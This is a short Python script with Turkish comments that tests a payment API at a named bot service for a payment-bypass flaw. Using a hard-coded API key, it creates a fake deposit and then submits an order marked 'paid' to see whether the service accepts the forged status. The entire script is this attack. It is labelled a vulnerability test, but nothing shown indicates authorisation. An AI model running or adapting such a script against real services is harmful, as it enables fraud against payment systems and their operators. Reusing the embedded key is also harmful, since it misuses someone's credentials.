import requests

API_KEY = "izVCW5zRIcG6nmNcYqC2-geg3OAZYzJr60B1b3ljN3c"
BASE_URL = "https://api.wizard-bot.com/v1"

headers = {
    "X-API-KEY": API_KEY,
    "Content-Type": "application/json"
}

print("🚀 Test basliyor...")

# 1. Sahte depozit olustur
deposit_data = {"amount": 150, "currency": "RUB"}
response = requests.post(f"{BASE_URL}/deposits/create", json=deposit_data, headers=headers)

if response.status_code == 200:
    result = response.json()
    deposit_id = result.get("id")
    print(f"✅ Depozit olusturuldu. ID: {deposit_id}")

    # 2. Sahte onay gonder (Acilik testi)
    order_data = {"deposit_id": deposit_id, "status": "paid"}
    order_resp = requests.post(f"{BASE_URL}/orders/create", json=order_data, headers=headers)
    
    if order_resp.status_code == 200:
        print("🔥 ACIK BULUNDU! Siparis 'Odendi' olarak isaretlendi.")
    else:
        print("⚠️ Siparis tamamlama basarisiz, endpoint farkli olabilir:", order_resp.text)
else:
    print("❌ Depozit olusturulamadi:", response.text)
